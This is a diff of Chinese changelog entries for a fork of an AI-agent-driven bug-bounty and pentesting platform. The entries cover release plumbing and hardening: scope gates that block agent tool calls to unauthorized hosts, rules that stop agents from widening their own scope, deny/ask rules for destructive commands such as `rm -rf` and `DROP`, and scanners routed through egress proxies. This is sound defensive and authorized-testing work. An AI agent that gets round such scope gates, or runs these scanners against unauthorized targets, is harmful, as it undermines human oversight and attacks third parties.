+- `hunter_card`：只展示已验签的 `verdict.json`，红灯（do-not-submit）返回非零。
+- `retention.sh`：不再 `source` agent 可写的配置（改白名单 KEY=VALUE 解析），
+  修复 `count_paths` 参数错位导致的「候选恒为 0」。
+- `proxy_sync.py`：读不到代理设置时保留旧配置并返回 2（不再删配置直连泄露出口 IP），
+  写 `proxy.env` 时对值做 shell 引号转义、文件以 0600 创建。
+- 镜像补装 `psycopg2-binary`（这些脚本依赖它，缺失时只能 fail closed）。
+
+#### 会话与沙箱
+- JWT 改 HttpOnly + SameSite=Strict cookie；`?token=` 仅限 SSE；登出与改密递增
+  `auth.token_version` 使旧令牌立即失效。
+- 首启生成一次性 setup token（日志 + `data/setup-token`），非回环来源的 `/api/auth/init`
+  必须携带；反代场景按 `X-Forwarded-For` 判定，不会把远程调用当成本机。
+- 请求体 8 MiB 上限（413）、`ReadTimeout`/`IdleTimeout`；登录限流按真实客户端 IP。
+- 工作区符号链接按解析后的真实路径二次校验，悬空链接直接拒绝。
+
+#### 交付链路
+- `install.sh`/`update.sh`/compose 改为本地构建本 fork 镜像，不再默认拉上游 `ruoji6/artex`。
+- `jwt.key` 不再以 `:ro` 挂载；`start.sh` 启动前从 data 卷恢复或生成。
+- release 增加测试门与 `origin/local` 祖先校验；Actions 全部 pin 到提交 SHA；CI 声明
+  `permissions: contents: read`。
+- `.gitignore` 覆盖 `config.json`，`release.sh` 拒绝提交含凭据的 `config.json`/`.env`。
+- 文档漂移修正：`-fixN` 更新语义、更新来源、`reset-password.sh` 用户名、部署说明。
+
+#### 测试
+- 新增 `evidence/verdict_test.go`（与 Python 闸门逐字节对齐 + 篡改/伪造拒绝）、
+  `server/auth_hardening_test.go`、`server/agent_guard_test.go`、
+  `server/retest_pack_test.go`、`server/workspace_test.go`、
+  `skills/src-retest/scripts/test_retest_gate_state.py`（ready/fixed/compare 状态机）。
+- `test_retest_adversarial.py` 38 例、`test_gates_hardening.py` 123 例、
+  `test_retest_gate_state.py` 11 例全部自包含并通过；`skill_lint` 38/38。
+
 ## [Unreleased]
+
+### 0.3.22-fix12 — 一键更新端到端验证
+
+- 无功能变更；用于验证「发布 → 页面检查 → 下载校验 → 换装 → 守护脚本重启」全链路。
+
+### 0.3.22-fix11 — 私有仓库在线更新修复
+
+- 修复私有仓库无法下载发布包：`browser_download_url` 带 Bearer token 会返回 404，
+  改为使用 GitHub REST 资产地址并声明 `Accept: application/octet-stream`
+  （`selfupdate.WithAPIAssets` / `Asset.DownloadURL`）。
+- 新增可选的真实链路测试 `TestLiveUpdateCheck`（需 `ARTEX_UPDATE_TOKEN`）：
+  校验版本比较、资产选择、下载、SHA256SUMS 比对与解包。
+
+### 0.3.22-fix10 — CI/CD
+
+- `release.yml` 改为 fork 专用：接受 `v<版本>-fix<N>` 标签，五平台交叉编译后自动创建 Release 并上传 zip + `SHA256SUMS`。
+- 移除上游的 Docker Hub 发布与 Vercel demo 部署（`demo.yml`）；私有 fork 不发布公共镜像与演示站。
+- `ci.yml` 覆盖 `local` 分支：`go vet` + `go test`（带 PostgreSQL service）+ 前端静态构建。
+
+### 0.3.22-fix9 — 部署命名统一
+
+- `/api/health` 的 `service` 字段由 `artex` 改为 `xfsrc`。
+- Compose 工程名 `xfsrc`，容器 `xfsrc-app` / `xfsrc-db`，数据卷 `xfsrc_pgdata`，
+  网络 `xfsrc_default` 固定 `172.18.0.0/16`（宿主机转发只监听 `172.18.0.1:3066`）。
+- 镜像变量改名 `XFSRC_IMAGE` / `XFSRC_TAG`。
+- Cookie 名（`artex_token`、`artex_basic_auth`）保持不变：改名会让所有会话与
+  访问验证失效，收益仅为内部标识一致性。
+
+### 0.3.22-fix8 — XFSRC 品牌与在线更新
+
+- 系统更名 ARTEX → XFSRC：前端标题/品牌/版权、登录与初始化页、侧边栏、启动 banner、Basic Auth realm、审批提示、通知测试文案；登录用户名同步改为 `XFSRC`。
+- 替换 logo：`logo.png` / `icon.png` / `favicon.ico` 由本地图片生成（去透明边、方形留白、压缩到 ~53 KB）。
+- 在线更新指向本 fork：`selfupdate.Repo = xftk666-alt/XFSRC`。
+- 版本比较支持 `-fixN`：`0.3.22-fix7 > 0.3.22-fix6 > 0.3.22`；其余后缀（dev / git describe）仍判为不可比较。
+- 私有仓库更新认证：`update.network` 新增 `token` 字段，请求时带 `Authorization: Bearer`；设置页新增只读 Token 输入（不回显）。
+- 更新构件布局：二进制改为 `/app/bin/artex`（可写挂载），`start.sh` 优先使用它；`-data` 与 `ARTEX_SKILL_DIR` 显式固定回 `/app`，避免 `BaseDir()` 随可执行文件漂移。
+
+### 0.3.22-fix7 — 文档与发布
+
+- README 顶部明确使用场景：海外正规授权 SRC（HackerOne / Intigriti / Bugcrowd）。
+- 移除上游的「交流群」章节与微信二维码图片（`screenshots/wx.png`）。
+- 移除「参考」章节（第三方项目链接）。
+- 把上游的「使用限制 / 禁止事项」替换为本 fork 的「使用范围」：原条款在 AGPL-3.0 之外追加限制，与本 fork 的授权测试用途冲突；AGPL-3.0 许可声明与 `LICENSE` 文件按协议要求保留。
+- 发布包：linux/amd64、linux/arm64、darwin/amd64、darwin/arm64、windows/amd64 与 `SHA256SUMS`。
+
+### 本地安全修复（0.3.22-fix6）
+
+- 新增发请求前的授权闸：从 Bash/WebFetch/自定义工具参数提取 host，任何未命中 `task_scope` 的目标一律阻断（fail-closed）；聊天会话无任务 scope，不套用该闸。
+- `task_scope` 仅信任 `manual` / `goals` 来源；planner/worker 写入的 `agent` 与自动发现的 `auto` 只用于覆盖度，不再授权。授权范围可由人工在任务页确认后升格（同名条目自动提升来源）。
+- `add_task_scope` 仅允许目标拆解（goals）与人工主控（human）调用，探索侧无法自行扩大边界。
+- 工作区文件管理器拒绝 `evidence/`、`traffic/`、`sessions/`、`transcripts/`、`jwt.key` 等运行时敏感路径，并对符号链接做二次解析校验。
+- 拦截规则只匹配实际执行面：Write/Edit 只看 `file_path`，不再扫描报告正文中的 `rm -rf`、`DROP` 等字符串。
+- 删除类/DELETE 请求规则由 `deny` 改为 `ask`（300 秒，超时拒绝），授权测试可人工放行。
+- `traffic_capture=false` 时存储层不再写入流量（代理仍可监听，但不落盘）。
+- MITM CA 私钥启动时与按需生成后均收紧为 0600。
+- 日志写库前做 UTF-8 清洗，避免二进制内容导致整行丢失。
+- `Manager.Close` 先停止任务 goroutine 再关闭连接池，消除关闭期写入竞态。
+- 新增 `llm_usage` 到启动 schema，修复独立包测试依赖外部建表的问题。
+- 登录接口按来源 IP 限流（10 次/分钟，超限 429 + Retry-After），成功登录清零；消除无上限口令猜测。
+- OOB/interactsh 服务器与令牌改为读取 `/app/data/oob/config.env`，留空即禁用外部 OOB（Intigriti 等 program 常禁止）。
+- 扫描器出口代理：启动时把 `global_proxy` 同步为 proxychains 配置；nmap 经 `pc_run.sh`、naabu 走原生 SOCKS5、ffuf/katana/nuclei/dalfox/sqlmap/subfinder/gau/tlsx 走 `proxy_exec.sh` 注入原生代理参数。RFC1918/回环目标自动绕过代理。
+- ffuf/katana/nuclei 默认限速（`-rate 50` / `-rl 50` / `-t 20`），降低触发 program 限速的风险。
+- 支持 HTTP Basic Auth 访问门（默认关闭，凭据只存 bcrypt 哈希）；`/api/health` 保持公开。
+- 新增数据保留任务：`/app/data/retention.env` 配置；每 24 小时清理过期 sessions/transcripts（默认 30 天）、聊天活动与后端日志（默认 90 天），证据/任务/漏洞永不删除。
+- 升级时把既有任务的 `task_scope` 来源标记为 `manual`，避免 fail-closed 闸门把历史任务全部拦住。
+- 授权闸新增目标文件扫描：`nuclei/httpx/naabu/katana -l`、`nmap -iL`、`subfinder -dL`、`cat FILE |`、`xargs -a FILE`、`< FILE` 引用的目标列表会被读取并逐条校验；列表不可读时按 fail-closed 阻止。`-w`（字典）、`-o`（输出）与 URL 形式的值不当作目标文件。
+- 授权闸的 host 提取器忽略 base64/JWT 形态的串（`jwt_decode.py 'eyJ...'` 不再被误判为域名）。
+- 出口代理改走 `172.18.0.1:3066`（宿主机 `karing-docker-forward` 只暴露到 Docker 网桥，无凭据）；
+  本机 Karing 的 netshare 入站（原 `0.0.0.0:4066/4067`）已随 `host=127.0.0.1` 关闭，局域网不再能借用本机出口。
+- 新增 CI（PostgreSQL service + `go vet` + `go test` + 前端静态构建）。
+- 修复 4 个漂移测试；README 移除未接线的 `enrich` 声明。
+
+
+
 
 ## [0.3.18] - 2026-10-12
 
